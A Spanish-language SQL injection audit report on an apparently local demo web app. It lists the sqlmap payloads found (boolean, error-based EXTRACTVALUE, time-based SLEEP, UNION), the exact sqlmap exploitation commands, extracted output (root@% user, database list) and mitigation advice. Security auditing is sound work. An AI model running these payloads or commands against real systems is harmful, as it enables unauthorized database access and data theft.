# Informe de Auditoría DAST - SQL Injection

Fecha: 2026-04-13T10:44:09Z
Objetivo: http://web.dev.local:8083
Herramientas: curl, sqlmap (v1.10.2)

## Resumen Ejecutivo
Se realizó un análisis dinámico (DAST) sobre http://web.dev.local:8083 centrado en detección y explotación de inyecciones SQL. Se identificó un parámetro GET vulnerable (id) y se explotó con sqlmap para obtener el usuario actual y las bases de datos disponibles.

Vulnerabilidad encontrada: Sí
Explotación exitosa: Sí (extracción de current user y listado de bases de datos)

## Vectores Analizados
- Página raíz: GET http://web.dev.local:8083
- Formulario detectado (método GET) con campo "id" (input name="id")

Contenido extraído (vectores):
- Form: GET http://web.dev.local:8083?id=&Submit=Submit

## Hallazgos
1) Parámetro vulnerable
- Parámetro: id (GET)
- Técnicas detectadas por sqlmap:
  - boolean-based blind (OR boolean-based blind - WHERE or HAVING clause)
  - error-based (MySQL EXTRACTVALUE)
  - time-based blind (SLEEP)
  - UNION query (UNION ALL SELECT)

- Ejemplo de payloads (tal como reportó sqlmap):
  - OR boolean-based:
    id=1448' OR NOT 8041=8041#&Submit=Submit
  - Error-based (EXTRACTVALUE):
    id=1448' AND EXTRACTVALUE(9294,CONCAT(0x5c,0x71707a7171,(SELECT (ELT(9294=9294,1))),0x716b6a7071))-- ZgWj&Submit=Submit
  - Time-based SLEEP:
    id=1448' AND (SELECT 5317 FROM (SELECT(SLEEP(5)))YnQv)-- nvFL&Submit=Submit
  - UNION query (example):
    id=1448' UNION ALL SELECT CONCAT(0x71707a7171,0x71536d4e7068...,0x716b6a7071),NULL#&Submit=Submit

- Comando sqlmap usado (detección inicial):
  sqlmap -u "http://web.dev.local:8083" --crawl=1 --batch --forms --output-dir=/tmp/scan_xxx

- Comando sqlmap de explotación (extracción):
  sqlmap -u "http://web.dev.local:8083" --crawl=1 --batch --forms --dbs --current-user --threads=5 --output-dir=/tmp/scan_xxx

## Evidencia de Explotación (salida de sqlmap)
- Back-end DBMS identificado: MySQL (MariaDB fork)
- Current user extraído:
  current user: 'root@%'

- Bases de datos disponibles extraídas:
  - information_schema
  - mysql
  - performance_schema
  - sqli_demo
  - sys

Fragmentos relevantes de la salida de sqlmap:
- "GET parameter 'id' is vulnerable."
- "current user: 'root@%'"
- "available databases [5]: information_schema, mysql, performance_schema, sqli_demo, sys"

## Impacto
- Confidencialidad: Se pudieron enumerar las bases de datos y el usuario de la BD (root@%), lo que indica acceso a información sensible.
- Integridad: Posibilidad de extracción y modificación de datos remotos si se explotan otros vectores (por ejemplo, con UNION o stacked queries si permiten ejecución).
- Disponibilidad: Técnicas time-based prueban que es posible provocar retrasos en el servidor; impacto de DoS limitado pero presente.

## Recomendaciones
1. Validar y sanitizar entradas del parámetro `id`. Usar consultas parametrizadas (prepared statements) y evitar concatenación de SQL.
2. Aplicar validación y whitelisting de tipos/valores (p. ej. si `id` debe ser numérico, validar enteros estrictamente).
3. Limitar permisos de la cuenta de conexión a la base de datos (evitar cuentas con privilegios root para la aplicación).
4. Implementar WAF o reglas de detección para patrones SQLi e investigar alertas.
5. Revisar y aplicar parches/actualizaciones a la pila (PHP, Apache, MySQL) y endurecer configuraciones.

## Comandos exactos ejecutados
- curl -sS -D /tmp/scan_xxx/headers.txt -o /tmp/scan_xxx/root.html "http://web.dev.local:8083"
- sqlmap -u "http://web.dev.local:8083" --crawl=1 --batch --forms --output-dir=/tmp/scan_xxx
- sqlmap -u "http://web.dev.local:8083" --crawl=1 --batch --forms --dbs --current-user --threads=5 --output-dir=/tmp/scan_xxx

## Archivos generados
- /tmp/scan_1776077111/sqlmap_crawl.out
- /tmp/scan_1776077111/sqlmap_exploit.out
- /tmp/scan_1776077111/root.html
- /tmp/scan_1776077111/extracted_vectors.txt

## Conclusión
Se detectó una inyección SQL en el parámetro `id` de la aplicación y se logró extraer información sensible (usuario de BD y listados de bases de datos) usando sqlmap con --batch. Se recomienda abordar urgentemente las recomendaciones de mitigación.

-- Fin del informe
